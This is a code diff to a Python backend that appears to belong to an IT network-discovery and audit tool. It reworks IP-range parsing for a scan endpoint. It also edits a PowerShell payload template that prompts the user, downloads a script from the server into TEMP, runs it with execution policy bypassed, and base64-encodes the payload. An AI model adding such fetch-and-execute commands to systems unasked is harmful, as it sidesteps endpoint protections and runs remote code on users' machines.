@@ -1394,10 +1394,35 @@ def download_device_pdf(device_id: str):
 @app.post("/discover/network-scan")
 def network_scan(request: NetworkScanRequest):
     try:
-        network = ipaddress.ip_network(request.ip_range, strict=False)
-        hosts   = list(network.hosts())
-        if len(hosts) > 512:
-            raise HTTPException(status_code=400, detail="IP range too large. Use /23 or smaller.")
+        raw_range = request.ip_range.strip()
+        hosts = []
+        if '-' in raw_range:
+            parts = [p.strip() for p in raw_range.split('-')]
+            start_ip = ipaddress.IPv4Address(parts[0])
+            if '.' in parts[1]:
+                end_ip = ipaddress.IPv4Address(parts[1])
+            else:
+                prefix = str(parts[0]).rsplit('.', 1)[0]
+                end_ip = ipaddress.IPv4Address(f"{prefix}.{parts[1]}")
+            
+            start_int = int(start_ip)
+            end_int = int(end_ip)
+            if end_int < start_int:
+                start_int, end_int = end_int, start_int
+            if (end_int - start_int + 1) > 512:
+                raise HTTPException(status_code=400, detail="IP range too large. Maximum 512 hosts permitted.")
+            hosts = [ipaddress.IPv4Address(ip) for ip in range(start_int, end_int + 1)]
+            network = ipaddress.ip_network(f"{start_ip}/24", strict=False)
+        else:
+            network = ipaddress.ip_network(raw_range, strict=False)
+            hosts = list(network.hosts())
+            if not hosts:
+                hosts = [network.network_address]
+            if len(hosts) > 512:
+                raise HTTPException(status_code=400, detail="IP range too large. Use /23 or smaller.")
+        
+        start_host = str(hosts[0])
+        end_host = str(hosts[-1])
     except ValueError as e:
         raise HTTPException(status_code=400, detail=f"Invalid IP range: {e}")
 
@@ -1566,10 +1591,13 @@ def network_scan(request: NetworkScanRequest):
     discovered = list(discovered_dict.values())
     logger.info(f"Scan complete: {len(discovered)} hosts found of {len(hosts)} scanned")
     return enrich_scan_results({
-        "discovered": discovered,
-        "total":      len(discovered),
-        "scanned":    len(hosts),
-        "ip_range":   request.ip_range,
+        "discovered":       discovered,
+        "total":            len(discovered),
+        "scanned":          len(hosts),
+        "ip_range":         request.ip_range,
+        "start_ip":         start_host,
+        "end_ip":           end_host,
+        "ip_subnet_range":  f"{start_host} – {end_host}"
     })
 
 
@@ -2015,8 +2043,7 @@ Write-Host "A mandatory IT security audit has been initiated."
 Write-Host "Please press ENTER to allow the scan to proceed..." -ForegroundColor Yellow
 Read-Host
 
-Invoke-WebRequest -Uri '{server_url}/api/get-audit-script?client_id={client_id}' -OutFile '$env:TEMP\\audit.ps1'
-& '$env:TEMP\\audit.ps1'
+curl.exe -s "{server_url}/api/get-audit-script?client_id={client_id}" -o "$env:TEMP\\audit.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\\audit.ps1"
 """
     
     encoded_cmd = base64.b64encode(ps_payload.encode('utf-16le')).decode('utf-8')
